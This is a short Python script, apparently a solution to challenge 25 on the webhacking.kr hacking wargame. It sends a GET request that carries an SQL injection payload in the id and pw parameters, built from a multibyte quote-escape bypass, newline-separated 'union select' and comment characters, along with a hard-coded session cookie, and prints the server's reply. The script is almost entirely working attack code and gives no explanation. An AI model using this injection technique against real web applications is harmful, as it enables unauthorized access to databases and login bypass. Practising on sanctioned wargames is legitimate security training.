import requests

url = "http://webhacking.kr/challenge/web/web-25/index.php"


headers = {

	"Host": "webhacking.kr",
	"Cookie": "PHPSESSID=3771a272772a41afe329096cccbd8dc6"
}

params = {
	"id":"%a1%27%0a/*",
	"pw":"%/%0aunion%0aselect%0a1%23"
	
}

req = requests.get(url, params=params,headers=headers)

print req.content

